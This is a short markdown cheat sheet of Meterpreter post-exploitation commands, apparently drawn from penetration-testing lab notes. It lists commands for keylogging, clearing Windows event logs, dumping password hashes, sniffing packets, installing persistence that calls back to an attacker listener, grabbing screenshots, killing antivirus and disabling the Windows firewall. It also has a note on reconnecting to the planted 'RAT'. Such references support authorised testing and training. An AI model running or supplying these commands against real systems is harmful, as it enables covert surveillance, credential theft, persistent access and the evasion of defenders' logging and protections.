
# Meterpreter
https://pentestmag.com/metasploit-cheat-sheet/
https://github.com/security-cheatsheet/metasploit-cheat-sheet

## key logging

- Start

	  keyscan start
	
- View

	  keyscan dump
	  
## clear logs

	clearev
	
## search for exploits for a session

	background
	use post/multi/recon/local_exploit_suggester 
	set session <session #>
	run

## dumping hashes

	run hashdump
	
	or
	
	run post/windows/gather/smart_hashdump

## sniffing packets

- Enable sniffer
	  
	  use sniffer
	  
- List interfaces
	
	  sniffer_interfaces
	  
- Start sniffer

	  sniffer_start <target_inteface> <#_of_packets> 
	  
- Dump sniffed traffic to pcap

	  sniffer_dump <interface> <file.cap>
	  
## persistence

	run persistence -h
	
	run persistence -A -i 20 -p <listening_port>
	run persistence -U -i 20 -p <listening_port>

Next time we need to login and access the RAT, we only need to load up the Metasploit multi handler and set the parameters (LPORT 666, LHOST <Kali_IP>, and RHOST <Windows_IP>. We will also have to set the payload to the corresponding payload inside of a Metasploit handler from task one. If we were remote, we would use the portfwd command to port forward, but again that is out of scope. 

## screen grab

	use espia 
	screengrab 
	
## disable antivirus

	run killav
	
	or 
	
	run post/windows/manage/killav

## disable windows firewall

	shell
	netsh firewall set opmode mode=disable
